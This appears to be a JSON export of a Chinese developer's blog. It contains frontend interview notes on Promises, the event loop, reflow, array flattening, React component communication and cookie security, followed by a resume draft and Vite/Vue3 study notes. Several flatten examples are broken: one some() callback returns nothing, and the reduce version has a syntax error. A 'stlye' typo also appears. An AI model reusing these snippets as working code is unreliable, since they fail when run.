Promise.reject(1);var p2 = new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(2); &#125;, 1000);&#125;);Promise.allSettled([p1, p2]).then( data =&gt; &#123;console.log(&#x27;resolve&#x27;, data);&#125;,);// 执行结果resolve [&#123;status: &quot;rejected&quot;, reason: 1&#125;, &#123;status: &quot;fulfilled&quot;, value: 2&#125;] async/await async/await是promise对象的语法糖 用于解决promise对象样板代码太多的问题 当函数中使用await时,函数需要用async修饰 await后根一个promise对象,await表达式的结果为promise resolve的值 而async方法返回一个promise对象 状态为resolve时的值就是async函数的返回值 该方法的缺点是:当await后的Promise状态变为rejected时,需要使用try/catch才能捕获到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const task = () =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; console.log(&#x27;1&#x27;); resolve(&#x27;2&#x27;); &#125;, 1000); &#125;);&#125;;async function test() &#123; console.log(0); const res = await task(); console.log(res);&#125;test();// 执行结果012async function task1() &#123; return &#x27;test&#x27;;&#125;task1().then(console.log);// 执行结果testconst task = () =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; reject(&#x27;test-reject&#x27;); &#125;, 1000); &#125;);&#125;;async function test() &#123; try &#123; const res = await task(); &#125; catch (e) &#123; console.log(&#x27;error&#x27;, e); &#125;&#125;test();// 执行结果error test-reject 使用Promise实现并发请求控制 对于并发请求,可以使用类似线程池的方式 1234567891011121314151617181920212223242526272829303132import axios from &quot;axios&quot;function multiRequest(urls: string[], maxNum: number): Promise&lt;any&gt; &#123; return new Promise&lt;any&gt;((resolve: Function, reject: Function) =&gt; &#123; // 请求列表 const requestURLS = [...urls] // 请求结果 const result: &#123;[key:string]:any&#125; = &#123;&#125; // 线程池 let urlPool:string[] = []; const createTask = (url: string) =&gt; &#123; urlPool.push(url); const onComplete = (err:any | null, res:any | null = null) =&gt; &#123; if(urlPool.length === 0) &#123; resolve(urls.map(url =&gt; result[url])) &#125; result[url] = err || res; urlPool = urlPool.filter(value =&gt; value !== url); if (urlPool.length &lt; maxNum &amp;&amp; requestURLS.length) &#123; createTask(requestURLS.pop() as string) &#125; &#125; axios.get(url).then( data =&gt; &#123; onComplete(null, data) &#125;, error =&gt; &#123; onComplete(error) &#125; ) &#125; while(requestURLS.length &amp;&amp; urlPool.length &lt; maxNum) &#123; createTask(requestURLS.pop() as string) &#125; &#125;)&#125; 事件循环 JS将任务划分为宏任务与微任务，宏任务队列可以有多个，但微任务队列只有一个 宏任务包括： script（全局任务） setTimeout setInterval setImmediate I/O UI rendering 微任务包括： process.nextTick Promise Object.observer MutationObserver 微任务优先级大于宏任务 任务执行过程如下： 执行栈为空 将script（全局）加入宏任务队列 执行栈为空则从宏任务队列中取出一个任务，放入执行栈 执行执行栈中的任务 遇到异步操作则交由异步处理块处理，异步块将回调函数根据类型放入宏任务队列or微任务队列 当执行栈为空时从微任务队列中取任务，并执行，直到微任务队列为空 再从宏任务队列中取一个任务执行 执行微任务队列中的所有任务 … 所有同步任务都在主线程执行，形成一个执行栈，主线程之外，还存在一个任务队列，异步任务执行队列中先执行宏任务，然后清空当次宏任务中的所有微任务，然后进行下一个tick（帧）如此循环 下面这段代码输出的结果是： 12345678910111213141516171819const first = () =&gt; (new Promise((resolve, reject) =&gt; &#123; console.log(3); let p = new Promise((resolve, reject) =&gt; &#123; console.log(7); setTimeout(() =&gt; &#123; console.log(5); resolve(); &#125;, 0); resolve(1); &#125;); resolve(2); p.then((arg) =&gt; &#123; console.log(arg); &#125;);&#125;));first().then((arg) =&gt; &#123; console.log(arg);&#125;);console.log(4); 首先将srcipt加入宏任务队列，然后取出该任务执行： 执行first函数打印3 构造p，打印7 将setTimeout的回调加入宏任务队列 执行resolve(1)，将p状态变为fullfilled，值为1 执行resolve(2)，将first()状态变为fullfilled，值为2 将p.then的回调加入微任务队列 将first().then的回调加入微任务队列 打印4 从微任务队列中取出任务按顺序执行： 打印1 打印2 执行宏任务队列中的任务，打印5 因此最终结果为374125 下面代码输出的结果: 123456console.log(1)setTimeout(() =&gt; &#123; console.log(2)&#125;, 0)Promise.resolve().then(() =&gt; console.log(3))console.log(4) 将script加入宏任务队列，然后取出该任务加入调用栈 执行调用栈中的script打印1 执行setTimeout并将回调加入宏任务队列 执行Promise.resolve()将状态变为fullfilled 执行then将回调函数加入微任务队列 执行最后一条语句打印4 从微任务中取出微任务并加入调用栈执行： 打印3 从宏任务队列取出宏任务并加入调用栈执行： 打印2 回流与重绘 首先来看看浏览器的渲染过程： html转DOM树 计算style 生成布局树 分层，生成分层树 主线程给每个图层生成绘制列表，交给合成线程处理 合成线程将图层分块 合成线程在光栅化线程池中将图块转成位图 合成线程发送绘制图块的命令drawquad给浏览器进程 浏览器根据命令绘制，并显示在显示器上 如果JavaScript做了修改DOM元素的几何属性（位置、尺寸）等操作，将会重新计算style，并且需要更新布局树，然后执行后面的渲染操作，即从1~9的步骤需要重新执行一遍。这个过程叫“重排”。 如果JavaScript修改了DOM的非几何属性，如修改了元素的背景颜色，不需要更新布局树和重新构建分层树，只需要重新绘制，即省略了3、4两个阶段。 在页面运行中，应该尽量避免重排和重绘，以提升渲染性能。 引发重排的操作 首次加载 DOM元素移动、增加、删除和内容改变会触发回流 当DOM元素的几何属性（width / height / padding / margin /border）发生变化就会触发回流。 读写元素的offset / scroll / client等属性会触发回流。 调用window.getComputedStyle会触发回流。 激活伪类 浏览器窗口动作（拖拽，拉伸） 添加或删除样式表 但需要注意的是浏览器自身会包含一些优化，一些属性的连续修改只会触发一次回流 1234document.getElementById(&#x27;root&#x27;).stlye.width = &#x27;100px&#x27;;document.getElementById(&#x27;root&#x27;).stlye.height = &#x27;100px&#x27;;document.getElementById(&#x27;root&#x27;).stlye.top = &#x27;10px&#x27;;document.getElementById(&#x27;root&#x27;).stlye.left = &#x27;10px&#x27;; 上面代码只会触发一次回流，这是因为浏览器自身有优化机制。 但是获取offset等元素属性，每获取一次都会触发一次回流，这是因为offset等属性，要回流完才能获取到最准确的值。 减少重排与回流 避免元素影响到所在文档流 用绝对定位（position: absolute;）使元素脱离文档流，这样元素的变化不会导致其他元素的布局变化，也就不会引起重排。 如果使用CSS的transform属性实现动画，则不需要重排和重绘，直接在合成线程合成动画操作，即省略了3、4、5三个阶段。由于没有占用主线程资源，并且跳过重排和重绘阶段，因此这样性能最高。 减少table使用，table属性变化使用会直接导致布局重排或者重绘 读写分离 由于浏览器对于JS的样式写操作会采用渲染队列机制，将写操作放入异步渲染队列，异步批量执行。当JS遇到读操作时候（offset / scroll / client），会把异步队列中相关的操作提前执行，以便获取到准确的值。 因此下面代码执行后，浏览器并不会触发4次重排，而是会将3个操作放入一个渲染队列中，异步批量执行，因此可能只会触发一次重排。 div.style.left = &#x27;10px&#x27;; div.style.top = &#x27;10px&#x27;; div.style.width = &#x27;20px&#x27;; div.style.height = &#x27;20px&#x27;; &lt;!--code￼26--&gt; 因此需要将读写分离来减少回流次数： div.style.left = &#x27;10px&#x27;; div.style.top = &#x27;10px&#x27;; div.style.width = &#x27;20px&#x27;; div.style.height = &#x27;20px&#x27;; console.log(div.offsetLeft); console.log(div.offsetTop); console.log(div.offsetWidth); console.log(div.offsetHeight); &lt;!--code￼27--&gt; 集中改变样式 虽然浏览器有异步渲染队列的机制，但是异步flush的时机我们没有办法控制，为了保证性能，还是应该集中改变样式。 修改样式改用className控制（在用js修改盒子的多个样式时，尽量使用className来一次性对盒子进行修改。）操作如下： // bad var left = 10; var top = 10; el.style.left = left + &quot;px&quot;; el.style.top = top + &quot;px&quot;; // good el.className += &quot; theclassname&quot;; // good el.style.cssText += &quot;; left: &quot; + left + &quot;px; top: &quot; + top + &quot;px;&quot;; &lt;!--code￼28--&gt; 通过使用DocumentFragment创建一个dom碎片,在它上面批量操作DOM，操作完成之后，再添加到文档中，这样只会触发一次重排。 复制节点，在副本上操作，然后替换原节点。 瓶颈分析 使用chrome的performance查看main部分火焰图，检查是否有过长时间的js block，避免大的js循环和大列表渲染，控制循环和列表的上限。导致页面卡顿，如果js执行超过几百ms就需要警惕了。 数组拍平的五种方法 数组拍平，即将一个多维嵌套数组转化为1维数组，同时如有需要，可以输入n用于控制拍平的深度，只有当嵌套的数组深度大于 n 时，才应该执行扁平化操作 1.toString 即利用toString方法将数组展开转化为字符串，然后利用split方法以,分隔，分开后需要利用+运算符将字符串转化为数字 缺点：是无法控制拍平深度 优点：书写简单 123456789101112//答案:function flatten(arr) &#123; return arr.toString().split(&#x27;,&#x27;).map(function(item)&#123; return +item;//类型准换为 &#125;)&#125;//解析:arr=[[1,2,3],[4,5,6],[7,8,9]]console.log(arr.toString());//输出 1,2,3,4,5,6,7,8,9console.log(arr.toString().split(&quot;,&quot;));//输出 (9) [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;] 2.展开运算符 利用...将数组展开，并且此处运用了Array.some进行类型检测，方法用于测试数组中是否至少有一项元素通过了指定函数的测试. 缺点：是无法控制拍平深度 优点：书写简单 123456789101112131415function flatten(arr) &#123; //检查 arr 中是否有元素是数组： while(arr.some((item)=&gt;&#123;Array.isArray(item)&#125;))&#123; arr = [].concat(...arr);//逐层拨开洋葱的心，直到没有数组 &#125; return arr;&#125;//解析：let arr = [1,2,3]console.log(...arr);// 1 2 3let arr2 = [[1,2,3],[4,5,6],[7,8,9]];console.log(...arr2);//[1,2,3] [4,5,6] [7,8,9]res = [].concat(...arr2)//[].concat([1,2,3],[4,5,6],[7,8,9])console.log(res);//[1, 2, 3, 4, 5, 6, 7, 8, 9] 3.递归 遇到数组则递归调用外层函数 优点：可以方便的设置拍平深度 缺点：书写复杂 12345678910111213var flat = function (arr, n)&#123; const res = [] if (n === 0) return arr arr.forEach((value) =&gt; &#123; if(Array.isArray(value)) &#123; res.push(...flat(value, n - 1)) &#125; else &#123; res.push(value) &#125; &#125;) return res&#125;; 4.flat方法 直接使用ES6中新增的方法Array.flatten(n) 优点：书写最简单且可设置深度 缺点：自定义程度不高 1234567891011121314function flatten(arr) &#123; return arr.flat(Infinity);&#125;//解析：var arr1 = [1, 2, [3, 4]];arr1.flat(); // [1, 2, 3, 4] var arr2 = [1, 2, [3, 4, [5, 6]]];arr2.flat();// [1, 2, 3, 4, [5, 6]] 默认展开一层深度 var arr3 = [1, 2, [3, 4, [5, 6]]];arr3.flat(2);// [1, 2, 3, 4, 5, 6] arr3.flat(Infinity); //使用 Infinity 作为深度，展开任意深度的嵌套数组 5.reduce+递归 利用reduce方法遍历数组，省去了额外定义遍历存放元素的代码 12345function flatten(arr) &#123; return arr.reduce((pre,cur)=&gt;&#123; pre.concat(cur instanceof Array?flatten(cur):) &#125;,[])&#125; 面试提示 解释扁平化多维数组的概念。为什么在某些情景下扁平化很有用？ 扁平化多维数组意味着通过删除任何嵌套数组并替换为它们的实际元素将其转换为单维数组。这在需要将数组作为扁平列表进行处理、而不考虑其原始嵌套结构时很有用。它简化了搜索、过滤或转换数组元素的操作。 是否存在需要考虑的特殊情况或边缘情景？你的解决方案如何处理这些情况？ 是的，我们应该考虑空数组或没有嵌套数组的情况。在这种情况下，函数应该返回原始数组，因为没有需要扁平化的嵌套数组。此外，我们需要处理深度 n 为负数或超出数组的实际深度的情况。在这些情况下，函数也应返回原始数组，而不进行扁平化。 你的解决方案如何处理输入数组中的循环引用或自引用数组？ 循环引用或自引用数组可能导致无限递归。提供的解决方案不显式处理循环引用。如果输入数组包含循环引用，递归扁平化过程可能导致无限循环或堆栈溢出错误。 try…catch可以捕获到异步代码的错误吗 不能 异步代码需要使用Promise, async/await来捕获 不用Websocket原生实现多个Tab相互通信(本地实现) localStorage，发消息时保存到localStorage，用window.addEventListener(&quot;storage&quot;(e) = &gt;)监听变化 Broadcast Channel API，一个Tab广播，另一个监听广播频道，支持浏览器不同上下文 SharedWorker，多个浏览器上下文共享脚本的机制，不同Tab链接到同一个SharedWorker即可共享数据 target和currentTarget的区别 e.target：实际触发的元素 e.currentTarget：绑定事件监听的元素 迭代器与生成器的关系⭐ Vue Vue2和Vue3的区别 数据绑定 Vue2使用getter/setter Vue3使用Proxy 对外API，Vue使用setup Diff算法 Vue2使用双端diff Vue3使用快速diff 借助了文本diff的思想 其中包含一个最长上升子序列的DP 编译上的优化 Vue3使用静态方法解决重复渲染的问题 Vue3会标记节点类型，直接根据类型进行高效更新 Diff算法 Computer和Watch的区别 VueRouter路由守卫 组合式API对比选项式API的优点 浏览器 从URL输入到页面展示过程中发生了什么 检查缓存 解析URL 使用DNS服务查找IP 得到MAC地址 HTTP2.0以前采用TCP TCP三次握手四次挥手 HTTPS的SSL握手 HTTP3.0使用基于QUIC的UDP 构建HTTP request request和respond的区别 CDN API/BFF 微服务 缓存 mysql读写分离 页面渲染 Vue、React的渲染过程 虚拟DOM 事件代理/绑定 首屏时间 CSR/SSR 渲染页面流程 浏览器存储机制 重绘与回流 如何减少回流 大量请求时如何进行优化 WebPack 对WabPack的理解 plugin和loader的区别 常见优化方式 Babel Vite和Wabpack的区别 TS TS项目搭建 ts支持的基本步骤： 转义ts 识别.ts/.tsx/.d.ts文件 语法检测与提示（vscode默认支持，通过tsconfig.json检测类型给出提示） eslint实现代码规范（tslint已不推荐） webpack如何支持ts 使用babel解析器 使用tsc解析器 babel配置 babel主要通过@babel/preset-typescript预设 编译TypeScript代码。 首先安装babel工具： 1npm install @babel/core babel-loader @babel/preset-typescript 然后在webpack配置文件中进行如下配置 123456789101112// webpack.config.jsmodule.exports = &#123; // ......other configure module: &#123; rules: [ &#123; test: /\\.ts$/, use: [&#x27;babel-loader&#x27;] &#125; ] &#125;&#125;; 在babel配置文件中进行如下配置： 1234// .babelrc&#123; &quot;presets&quot;: [&quot;@babel/preset-typescript&quot;]&#125; 但babel有如下缺点： 并不会读取tsconfig.json，babel只会读取自己的配置文件 不支持类型检查，需要使用其他工具，如fork-ts-checker-webpack-plugin，该插件也是依赖tsc进行代码转换。当前版本的create-react-app的ts模板就是使用的这两个插件配合 babel-loader的@babel/preset-typescript包并不完全支持ts所使用的先进es语法（如可选链）需要配合babel-preset 不支持import modelName = require('path')，推荐使用import moduleName from 'path' TSC 使用ts-loader，该loader调用tsc编译ts代码，并会进行类型检测 使用如下命令安装： 1npm install ts-loader 在webpack的配置文件中加入如下配置 123456789101112// webpack.config.jsmodule.exports = &#123; // ......other configure module: &#123; rules: [ &#123; test: /\\.ts$/, use: [&#x27;babel-loader&#x27;, &#x27;ts-loader&#x27;] &#125; ] &#125;&#125;; 使用ts-loader需要配置tsconfig.json React 组件生命周期，哪些hooks替换生命周期 Diff算法 对于Fiber框架的理解 把整个不可中断的渲染过程变得可以终端了。使得渲染过程可以断点续传（类似于操作系统中的分时间片进行抢占式调度） 组件间通讯的方式 父组件与子组件间通信 父组件向子组件传递props： 父组件： class Parent extends React.Component &#123; state = &#123; name:&quot;wang&quot; &#125; render() &#123; return &#123; &lt;div&gt; &lt;Child name=&#123;this.state.lastName&#125;&gt;&lt;/Child&gt; &lt;/div&gt; &#125; &#125; &#125; &lt;!--code￼39--&gt; 子组件向父组件传递参数需要利用父组件回调 父组件 class Parent extends React.Component &#123; // 提供回调 getChildMsg = (msg) =&gt; &#123; console.log(&#x27;接收到子组件数据&#x27;, msg) &#125; render() &#123; return ( // 传递给子组件 &lt;div&gt; 子组件：&lt;Child getMsg=&#123;this.getChildMsg&#125; /&gt; &lt;/div&gt; ) &#125; &#125; &lt;!--code￼40--&gt; 兄弟组件之间的通信需要借助状态提升： 将共享状态提升到最近的公共父组件 进行子到父通信 进行父到子通信 借助Context通信 调用React.createContext()创建Provider和Consumer两个组件 使用Provider组件作为父节点 设置Value属性，表示要传递的数据 效用Consumer组件接收数据 即Provider包裹父组件，Consumer被子组件包裹 // 创建context const &#123;Provider, Consumer&#125; = React.getContext() class App extends React.Component &#123; render() &#123; return ( // 使用Provider作为父节点 // 设置要传递的数据 &lt;Provider value=&quot;pink&quot;&gt; &lt;div className=&#x27;app&#x27;&gt; &lt;Node /&gt; &lt;/div&gt; &lt;/Provider&gt; ) &#125; &#125; const Node = props =&gt; &#123; return ( &lt;div className=&quot;node&quot;&gt; &lt;subNode /&gt; &lt;/div&gt; ) &#125; const SubNode = props =&gt; &#123; return ( &lt;div className=&quot;subnode&quot;&gt; &lt;Child /&gt; &lt;/div&gt; ) &#125; const Child = props =&gt; &#123; return &lt;div className=&#x27;child&#x27;&gt; &lt;!-- 使用consumer组件接受数据 --&gt; &lt;Consumer&gt; &#123; data =&gt; &lt;span&gt;我是子节点 -- &#123;data&#125;&lt;/span&gt; &#125; &lt;/Consumer&gt; &lt;/div&gt; &#125; ReactDOm.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) React-Native ReactNative的有点是什么 1、跨平台兼容性 使用React Native，您可以编写一次代码并多次部署到Android和iOS操作系统。对于创业公司来说，这样可以节省成本，并为程序员腾出时间完成其他重要任务。 2、React Native卓越性能 除了React Native外跨平台框架还有：Cordova、AppCan、APICloud、Phonegap、Ionic、Dcloud等，这些框架基本都是在一个WebView上进行渲染，也就是说他们的性能最多就是原生app中WebView的性能。而ReactNaitve是采用JS桥接加Native桥接两个方式合并起来的。React Native产出的并不是“网页应用”， 或者说“HTML5应用”，又或者“混合应用”。 最终产品是一个真正的移动应用，从使用感受上和用Objective-C或Java编写的应用相比几乎是无法区分的。 React Native所使用的基础UI组件和原生应用完全一致。 你要做的就是把这些基础组件使用JavaScript和React的方式组合起来。 3、社区力量 有着Facebook的支撑，相信会发展的很好。目前github的星数已经快7 万了，还有很多开源的组件和框架可以使用。 4、学习成本低 用的是react的框架和css的布局，有前端开发经验降低了不少学习成本，也大大减少了代码量。但是对于iOS或者安卓开发者来说，刚开始接触的时候，得接受一些思想上的转变。 5、调试方便 ipa安装好之后，就不需要频繁编译了，只需要reload一下! 把js代码从云服务器下载下来就可以呈现改变代码后的效果。而且RN支持hotReload，在调试界面的时候非常方便，修改代码之后保存，界面就自动跟着变化，这一点在调试的时候很方便，不过有时候有点慢，需要reload。Chrome在线调试也可以打断点，看日志。 6、热更新 频繁的app升级会让用户很烦，毕竟繁多的业务迭代，每次都通过APP审核，也算是噩梦。而且苹果的审核也很麻烦。现在很多大型app都使用了RN，通过微软提供的codepush可以很简单的实现热更新。 Cookie 如何提升Cookie的安全性 对Cookie中存储的铭感内容进行加密 设置HttpOnly为true 该属性值的作用是防止Cookie值被脚本读取 但HttpOnly属性只是增加了攻击者的难度，Cookie盗窃的威胁并没有彻底消除，因为Cookie还是有可能在传递的过程中被监听捕获后信息泄露 设置Secure为true 给Cookie设置该属性时，只有在https协议下访问时，浏览器才会发送该cookie 把cookie设置为secure，只保证cookie与Web服务器之间的数据传输过程加密，而保存在本地的cookie文件并不加密。如果想让本地cookie也加密，得自己加密数据 给Cookie设置有效期 如果不设置有效期，万一用户获取到用户的Cookie后，就可以一直使用用户身份登录。 在设置Cookie认证的时候，需要加入两个时间，一个是“即使一直在活动，也要失效”的时间，一个是“长时间不活动的失效时间”，并在Web应用中，首先判断两个时间是否已超时，再执行其他操作。 业务 说一说用户登录发生了什么 用户点击登陆时会带着账号密码（加密）调用后端的登录接口 后端接口接收到用户信息后根据账号查找数据库得到用户信息，如果没有或信息不匹配，则返回错误；如果验证通过则向前端返回一个token 前端拿到token后将其保存在Vuex或localStorage中并提示登录成功进行页面跳转 前端每次页面路由都需要验证token是否存在，这一操作通常封装到路由守卫中 在需要向后端发送请求时，会将token包含在请求头中一起发送给后端，这一操作通常封装在请求拦截器中 后端受到请求会判断请求头中是否包含token，且token是否失效，如果失效则返回错误信息 前端受到错误信息则清空存储的token，并提示身份过期跳转到登录界面，验证token一般封装在响应拦截器中，跳转到登录页面时需要携带当前跳转路径，登录成功后应该返回该路径 说一说前后端分别如何实现用户鉴权","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"八股","slug":"前端/八股","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E5%85%AB%E8%82%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"简历","slug":"简历","date":"2023-09-07T05:50:12.000Z","updated":"2024-07-30T11:26:33.938Z","comments":true,"path":"2023/09/07/简历/","permalink":"http://enderxiao.github.io/2023/09/07/%E7%AE%80%E5%8E%86/","excerpt":"","text":"项目经历 在线教育平台开发 项目经历 项目名称: 在线教育平台开发 项目描述: 开发一个在线教育平台，提供学生登录、签到、课程浏览、互动课堂、在线学习等功能。 技术架构: 前端界面使用React Native框架搭建，与后端API进行数据交互，实现用户权限管理、课程播放和作业提交等功能。 处理大量异步数据的加载和展示，优化页面性能和用户体验。 使用懒加载和分片加载减少首屏加载时间，提高页面加载速度。 使用LocalStorage缓存用户数据，减少请求次数，提高响应速度。 使用防抖和节流等策略，防止用户多次提交表单或触发组件多次渲染。 成果与效果: 成功开发并部署了功能完善的在线教育平台，提供了学生登录、签到、课程浏览、互动课堂、在线学习等功能。 通过优化页面加载速度和用户体验，提高了平台的性能和用户满意度。 后续工作: 持续改进平台的功能和性能，添加更多教育相关的功能模块，如在线测验、讨论区等。 进一步优化前端代码和后端API，提高系统的稳定性和扩展性。 收集用户反馈，不断改进平台的用户界面和功能，以满足不同用户的需求。 通过使用React Native框架搭建前端界面，并与后端API进行数据交互，该项目成功开发了一个功能完善的在线教育平台。为了提高页面性能和用户体验，采取了懒加载和分片加载策略，减少首屏加载时间，并使用LocalStorage缓存用户数据以提高响应速度。同时，使用防抖和节流等策略防止用户多次提交表单或触发组件多次渲染。这些优化措施有效提升了平台的性能和用户满意度。在后续工作中，计划不断改进平台的功能和性能，并根据用户反馈持续优化用户界面和功能，以提供更好的在线教育体验。 异步数据加载和展示优化： 分页加载：对于大量数据的展示，可以采用分页加载的方式，每次加载适量数据，减少页面加载时间。 虚拟滚动：对于长列表的展示，使用虚拟滚动技术，只渲染可见区域的数据，减少页面渲染时间和内存占用。 数据缓存：对于频繁访问的数据，可以使用LocalStorage或IndexedDB进行缓存，减少请求次数，提高响应速度。 首屏加载性能优化： 懒加载：将页面中非关键内容延迟加载，只在用户需要时才加载，减少首屏加载时间。可以使用React Suspense和React.lazy等技术实现懒加载。 分片加载：将页面的代码分为多个模块，按需加载，减少首屏需要加载的代码量。可以使用Webpack的代码分割功能实现分片加载。 用户数据缓存： 使用LocalStorage：对于用户的登录状态、学习进度等数据，可以使用LocalStorage进行缓存，提高用户体验和响应速度。 合理缓存策略：根据数据的更新频率和重要性，制定合理的缓存策略，避免缓存过期或过多占用存储空间。 防止用户多次提交和组件多次渲染： 防抖：对于用户可能频繁触发的操作，如点击按钮提交表单，可以使用防抖技术，限制触发频率，防止多次提交。 节流：对于需要频繁触发的事件，如滚动事件、输入框输入事件，可以使用节流技术，限制触发频率，减少组件渲染次数。 通过采用懒加载、分片加载、数据缓存、防抖和节流等优化策略，可以提升在线教育平台的性能和用户体验，减少页面加载时间、优化数据展示，并防止用户多次提交和组件多次渲染。 手写数学公式识别 项目经历 项目名称: 手写数学公式识别网络 项目描述: 使用encoder-decoder结构搭建手写数学公式识别网络，将图片识别为Latex字符串。项目创新点在于将Latex串处理为树形结构，转化为子节点串、父节点串和结构串的组合，利用Latex串的特点进行识别。 技术架构: encoder部分采用ResNet提取图像特征。 decoder分为两个子层： 第一层采用TransformerDecoder的结构，计算图片和父节点串之间的对应关系。 第二层采用两个TransformerDecoder结构的解码器： 第一个解码器计算第一层的输出与子节点串的对应关系。 第二个解码器计算图片与第一个解码器得到的结果的对应关系。 将得到的输出映射到字典空间，预测Latex串与结构串，并根据这两个串得到原始的Latex串。 成果与效果: 在CHROME2014、2019 HME100K等公开数据集上分别取得61%、55%的良好效果。 后续工作: 使用Yolov8对图片的公式部分与中文部分进行分割。 分别使用不同的网络识别中文与数学公式，实现数学主观题图像到文本的识别。 通过使用encoder-decoder结构和创新的Latex串处理方法，该项目实现了手写数学公式的识别。采用ResNet提取图像特征，并通过TransformerDecoder结构的解码器进行多层解码，最终将输出映射到字典空间以预测Latex串与结构串。该方案在公开数据集上取得了良好的识别效果。在后续工作中，使用Yolov8对图片进行公式和中文部分的分割，并使用不同的网络进行中文和数学公式的识别，进一步提高数学主观题图像到文本的识别能力。 以下是对项目经历的优化建议： 项目描述简化： 将项目描述中的具体技术细节进行简化，突出项目的创新点和成果。 结构化描述： 将项目的整体结构进行清晰的描述，包括encoder-decoder结构和各个子层的功能。 技术细节优化： 在描述技术细节时，可以提供更具体的信息，如具体使用的ResNet版本、TransformerDecoder的参数设置等。 数据集效果描述： 描述数据集的名称和规模，并提供更具体的效果指标，如准确率、召回率等。 后续工作展望： 提供项目的后续工作展望，如使用Yolov8进行公式和中文部分的分割，进一步提高数学主观题图像到文本的识别效果。 通过优化项目经历的描述，可以更清晰地展示项目的创新点、技术细节和成果。这样能够更好地突出个人的能力和项目的价值，给招聘者留下深刻的印象。同时，建议在简历中提供更多具体的项目细节和成果，以便招聘者更好地了解您的能力和经验。 自我评价 我是一个热爱前端开发的工程师，熟悉HTML，CSS，熟悉Sass预处理语言，具有扎实的JS基础，熟悉ES6+语法，TypeScript语法，熟悉Vue技术栈（Vue2/Vue3，Vue router，Pinia），了解webpack，vite前端工程化工具，了解git项目管理工具，了解nodejs框架。","categories":[],"tags":[]},{"title":"前端补缺Vite","slug":"前端补缺Vite","date":"2023-08-09T08:11:25.000Z","updated":"2024-07-30T11:26:33.927Z","comments":true,"path":"2023/08/09/前端补缺Vite/","permalink":"http://enderxiao.github.io/2023/08/09/%E5%89%8D%E7%AB%AF%E8%A1%A5%E7%BC%BAVite/","excerpt":"","text":"简介 Vite是由Vue公司开发的新型前端构建工具，由两部分组成： 一个开发服务器，基于原生ES模块提供了丰富的内建功能，例如模块热更新（HMR） 一套构建指，使用Rollup打包代码， Vite可通过JS API和插件API进行拓展 搭建项目 1234npm init vite@latestnpm create vite@latestyarn create vitepnpm create vite 以上均可 这样创建会询问你项目名称和模板 同时也可以使用参数直接指定 1234npm create vite@latest my-vue-app -- --template vue # npm 7+npm create vite@latest my-vue-app --template vue # npm 6.xyarn create vite my-vue-app --template vuepnpm create vite my-vue-app --template vue 执行过程 在项目搭建完成后我们可以使用 1npm run dev 命令来运行项目 该命令首先回去寻找项目目录下的package.json文件中的scripts标签中的dev标签 在Vite项目中dev标签会被映射为vite 该命令首先会从本地的node_module中查找bin目录下的可执行vite 如果没有则会去全局目录中查找 Vue3补充 Vue3支持三种书写风格： option API setup函数 setup函数需要将数据返回： &lt;template&gt; &lt;div&gt; &#123;&#123; a &#125;&#125; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default &#123; setup() &#123; const a = 1 return &#123; a &#125; &#125; &#125; &lt;/script&gt; 123456789101112131415 - 使用双花括号进行双向绑定- setup语法糖： - ```vue &lt;template&gt; &lt;div&gt; &#123;&#123; a &#125;&#125; &lt;/div&gt; &lt;/template&gt; &lt;script steup lan=&quot;ts&quot;&gt; const a:number = 1 &lt;/script&gt; 直接就能进行双向绑定，需要注意的是setup在单页组件（SFC）中只能有一个 v-once，即之渲染依次 v-memo=&quot;[]&quot;list中接收一个值，配合v-for进行性能优化 ref全家桶 在Vue2的选项是API中我们定义响应式对象会这样创建： 123456789&lt;script lang=&quot;ts&quot;&gt; export default &#123; data() &#123; return &#123; age:18 &#125; &#125; &#125;&lt;/script&gt; 但在组合式API中，我们则需要使用ref或reactive来注册响应式对象： isRef可以判断一个对象是否为ref对象 shallowRef创建浅层次的响应式对象，即引用对象中的数值变化不会引起它的视图变化，需要地址发生变化才会引起视图变化 需要注意的是如果在同一作用域对ref和shallowRef对象同时进行修改，shallowRef会受到ref的影响导致视图改变 triggerRef用于强制更新收集的依赖 上面提到的使用ref影响shallowRef的原因是在更新ref对象时调用了triggerRef customRef自定义Ref，接收一个回调函数作为参数，回调函数有两个参数track和trigger，分别用于收集和触发更新，该回调函数必须实现get和set方法 注意： 可以在浏览器的控制台设置中 &gt; 首选项 &gt; 控制台 &gt; 启用自定义格式化程序 可以让Ref对象在输出时更简洁 此外在Vue2中介绍过使用ref获取DOM元素的功能，Vue3中同样可以： 123456789101112131415161718192021&lt;template&gt; &lt;div&gt; &lt;div ref=&quot;dom&quot;&gt; 我是DOM &lt;/div&gt; &lt;button @click=&quot;change&quot;&gt; 获取DOM &lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import &#123; ref &#125; from &#x27;vue&#x27; const dom = ref&lt;HTMLDivElement&gt;() const change = () =&gt; &#123; // 此处使用?.断言来辅助TS推断 // 注意由于setUp标签渲染比DOM快，因此函数外读取将为undefined // 因此可以放在点击事件中 console.log(dom.value?.innerText) &#125;&lt;/script&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;template&gt; &lt;div&gt; Ref: &#123;&#123; Man &#125;&#125; &lt;/div&gt; &lt;div&gt; shallowRef: &#123;&#123; Man3 &#125;&#125; &lt;/div&gt; &lt;button @click=&quot;change&quot;&gt; 修改 &lt;/button&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot;&gt; import &#123; ref, isRef, shallowRef, triggerRef, customRef &#125; from &#x27;vue&#x27; import type &#123; Ref &#125; from &#x27;vue&#x27; // Ref的泛型 // 自定义Ref function MyRef&lt;T&gt;(value:T) &#123; return customRef((track, trigger) =&gt; &#123; return &#123; get() &#123; track() return value &#125;, set(newVal) &#123; value=newVal trigger() &#125; &#125; &#125;) &#125; type M 